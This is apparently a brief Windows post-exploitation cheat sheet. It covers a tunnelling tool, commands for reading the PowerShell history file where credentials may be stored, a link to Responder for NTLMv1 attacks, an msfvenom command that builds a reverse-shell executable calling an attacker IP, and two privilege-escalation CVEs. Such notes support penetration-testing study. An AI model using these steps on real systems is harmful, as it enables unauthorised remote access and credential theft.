Forwarding service

[TCP/UDP tunnel over HTTP](https://github.com/jpillora/chisel)

PowerShell history file

```cmd
REM location
cd C:\Users\<User Account>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine
REM file
type C:\Users\<User Account>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

[LAN Manager authentication level](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/network-security-lan-manager-authentication-level)

- [NTLMv1 attack](https://github.com/SpiderLabs/Responder)

Check unusual programs

```
C:\Program Files
C:\Program Files (x86)
```

MSFVenom Reverse Shell Payload

```
msfvenom -p windows/shell_reverse_tcp lhost=<attacker ip> lport=<attacker listening port> -f exe > rev.exe
```

Exploits

- CVE-2021-1732
- MS10-059